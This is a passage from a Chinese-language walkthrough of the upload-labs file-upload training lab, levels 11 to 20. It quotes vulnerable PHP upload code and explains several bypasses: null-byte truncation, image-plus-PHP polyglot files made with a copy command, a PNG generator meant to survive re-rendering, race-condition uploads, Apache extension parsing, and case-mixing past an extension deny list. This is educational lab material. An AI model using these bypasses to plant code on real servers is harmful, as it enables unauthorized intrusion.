class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+1);<br>    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(10, 99).<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里使用了白名单,只允许jpg,png,gif后缀上传，但是这里通过$img_path &#x3D; $_GET[‘save_path’].”&#x2F;“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;拼接成文件储存路径,可通过00截断进行绕过</p><p>原理:修改后文件储存路径变成.&#x2F;upload&#x2F;4.php%00&#x2F;随机数&#x2F;.jpg</p><p> 而php相关文件函数会认为%00是结束的标志,就成了..&#x2F;upload&#x2F;4.php</p><p>截断条件：<br>1、php版本小于5.3.4<br>2、php.ini的magic_quotes_gpc为OFF状态<br><img src="https://img-blog.csdnimg.cn/20210614234802699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此处自己没有那么低的php所以偷图来凑</p><p><strong>Pass-12</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+1);<br>    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(10, 99).<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传失败&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>与Pass-11不同,这里用到了POST传值,这里用到的也是00截断</p><p>但是%00指的是一个空字符,代表结束,GET传值因为url编码会把它解析成空字符,而POST传值没有这个特点,所以我们得手动通过通过请求头的hex编码所对应的地方添加00（十六进制）来达到目的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">因此先在upload/后添加任意字符（一般为空格，因为空格对应的hex码为20比较好记）<br>通过hex编码我们可以找到upload/的位置，把它后面的20改为00即可。<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210615000340716.png" alt="在这里插入图片描述"><br>还是由于这里没有低版的php截不了图</p><p><strong>Pass-13</strong><br><img src="https://img-blog.csdnimg.cn/20210615211658194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>制作图片马<br>在cmd中执行copy 1.jpg &#x2F;b + phpinfo.php &#x2F;b phpinfo.jpg</p><p><img src="https://img-blog.csdnimg.cn/20210615212613356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以利用文件包含<br><img src="https://img-blog.csdnimg.cn/20210615212851737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功解析了</p><p><strong>Pass-14</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> isImage(<span class="hljs-variable">$filename</span>)&#123;<br>    <span class="hljs-variable">$types</span> = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-variable">$info</span> = getimagesize(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-variable">$ext</span> = image_type_to_extension(<span class="hljs-variable">$info</span>[2]);<br>        <span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=0)&#123;<br>            <span class="hljs-built_in">return</span> <span class="hljs-variable">$ext</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其实就是多了对文件类型的判断，getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。<br>绕过方式和Pass-13一样</p><p><strong>Pass-15</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> isImage(<span class="hljs-variable">$filename</span>)&#123;<br>    //需要开启php_exif模块<br>    <span class="hljs-variable">$image_type</span> = exif_imagetype(<span class="hljs-variable">$filename</span>);<br>    switch (<span class="hljs-variable">$image_type</span>) &#123;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>            <span class="hljs-built_in">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>            <span class="hljs-built_in">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>            <span class="hljs-built_in">break</span>;    <br>        default:<br>            <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-built_in">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210616112729470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>exif_imagetype()函数用于判断一个图像的类型<br>所以绕过和Pass-13一样<br><strong>Pass-16</strong><br>是一个文件的二次渲染<br>先参考：<a href="https://xz.aliyun.com/t/2657#toc-3">https://xz.aliyun.com/t/2657#toc-3</a><br>直接利用现成的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$p</span> = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,<br>           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,<br>           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,<br>           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,<br>           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,<br>           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,<br>           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,<br>           0x66, 0x44, 0x50, 0x33);<br><br><br><br><span class="hljs-variable">$img</span> = imagecreatetruecolor(32, 32);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = 0; <span class="hljs-variable">$y</span> &lt; sizeof(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += 3) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+1];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+2];<br>   <span class="hljs-variable">$color</span> = imagecolorallocate(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   imagesetpixel(<span class="hljs-variable">$img</span>, round(<span class="hljs-variable">$y</span> / 3), 0, <span class="hljs-variable">$color</span>);<br>&#125;<br><br>imagepng(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>运行后用16进制形式打开文件<br><img src="https://img-blog.csdnimg.cn/20210615222029309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将这个文件上传抓包拦截，修改里面的内容，当然也可以直接打开修改在上传<br><img src="https://img-blog.csdnimg.cn/20210615223046312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功解析了<br><img src="https://img-blog.csdnimg.cn/20210615223104852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>Pass-17</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$file_name</span>,strrpos(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+1);<br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. rand(10, 99).<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             rename(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-built_in">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析源码move_uploaded_file($temp_file, $upload_file)会把上传的文件先移到一个临时文件，然后判断文件是否合法了在移动回去。<br>所以需要利用条件竞争删除文件时间差绕过。使用burpsuite<br><img src="https://img-blog.csdnimg.cn/20210615230946723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210615231018831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Start attack<br>成功访问到<br><img src="https://img-blog.csdnimg.cn/20210615231108313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-18</strong><br>查看源码<br><img src="https://img-blog.csdnimg.cn/20210616111842724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210616112237535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>前面有个upload,那我们利用条件竞争绕过访问改名前的文件时得在文件前面也要加个upload<br><img src="https://img-blog.csdnimg.cn/20210616123638277.png" alt="在这里插入图片描述"></p><p>7z后缀并不被Apache服务器所识别，却在上传文件名后缀的白名单中，可以利用Apache的解析漏洞将上传的7z后缀文件当做php文件解析<br><img src="https://img-blog.csdnimg.cn/20210616124250310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功解析<br><strong>Pass-19</strong><br><img src="https://img-blog.csdnimg.cn/20210616124545318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-variable">$file_ext</span> = pathinfo(<span class="hljs-variable">$file_name</span>,PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123; <br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>采用了黑名单的限制，大小写混写可绕过<br><img src="https://img-blog.csdnimg.cn/20210616124733276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-20</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span>(!empty(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;<br>    //检查MIME<br>    <span class="hljs-variable">$allow_type</span> = array(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        //检查文件名<br>        <span class="hljs-variable">$file</span> = empty(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$file</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, strtolower(<span class="hljs-variable">$file</span>));<br>        &#125;<br><br>        <span class="hljs-variable">$ext</span> = end(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$allow_suffix</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$file_name</span> = reset(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[count(<span class="hljs-variable">$file</span>) - 1];<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;请选择要上传的文件！&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>1.首先会对mime进行检测，所以要上传图片的mime<br>2.检查save_name是否为空,如果为空就用文件名赋值给$file,否则用save_name<br>3.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 